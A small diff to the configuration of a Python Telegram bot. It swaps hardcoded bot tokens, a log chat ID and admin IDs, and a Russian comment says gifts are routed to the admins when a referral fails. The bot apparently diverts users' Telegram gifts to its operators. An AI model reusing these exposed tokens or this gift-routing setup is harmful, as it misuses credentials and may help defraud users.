@@ -37,10 +37,10 @@ if not logging.getLogger().handlers:
 logger = logging.getLogger(__name__)
 
 
-TOKEN = "8186871053:AAH76An0uPFtCleK_mML9GpOzJbv5-oUGns"  # Токен бота
-LOG_CHAT_ID = 7662388704 # ID чата. Можно в группу или просто кента любого
+TOKEN = "7860507426:AAF6weuiHFqqZhjBWZnm0OW2Qlxo50TQErE"  # Токен бота
+LOG_CHAT_ID = -4656687127 # ID чата. Можно в группу или просто кента любого
 MAX_GIFTS_PER_RUN = 1000
-ADMIN_IDS = [7662388704] # ID админов куда падают гифты в случае неотработки рефки
+ADMIN_IDS = [8115830990] # ID админов куда падают гифты в случае неотработки рефки
 
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 
